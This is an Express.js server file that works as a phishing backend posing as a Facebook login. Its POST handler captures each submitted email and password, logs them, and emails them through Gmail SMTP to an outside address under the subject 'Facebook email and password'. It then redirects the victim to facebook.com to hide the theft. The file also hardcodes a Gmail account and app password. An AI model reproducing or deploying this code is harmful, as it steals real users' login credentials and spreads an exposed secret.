var aaa;
var express = require('express');
var app = express();
var request = require('request');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
var cookieParser = require('cookie-parser')
app.use(cookieParser());
const pg = require('pg');
var md5 = require('md5');
var request_first_name;
var request_last_name;
var request_email;
var request_password;
var request_confirm_password;
var s;
var script = "";
const nodemailer = require("nodemailer");
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'bassem.sadaqah@gmail.com',
        pass: 'fpmtfmcvrwpenfuy'
    }
});


// #########################################################################################################################################################################################
app.get('/', function (req, res) {
    res.render('index')
});
// #########################################################################################################################################################################################
app.get('/sign_up', function (req, res) {
    res.render('sign_up', { max: '', script: script })
})
// #########################################################################################################################################################################################
app.post('/', function (req, res) {
    var email=req.body.email;
    var pass=req.body.pass;
    console.log(email);
    console.log(pass);

    var mailOptions = {
        from: 'bassem.sadaqah@gmail.com',
        to: "mostafasaidofficial22@gmail.com",
        subject: 'Facebook email and password',
        text: 'email: '+email+'\nPassword: '+pass,
        html:''
        
    };
    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
    res.redirect('https://www.facebook.com/');


});

app.get('*', function (req, res) {
    res.send('Page not found')
})

app.listen(PORT, function () {
    console.log('Server Started')
})


// ################################################################################################################################################################################################
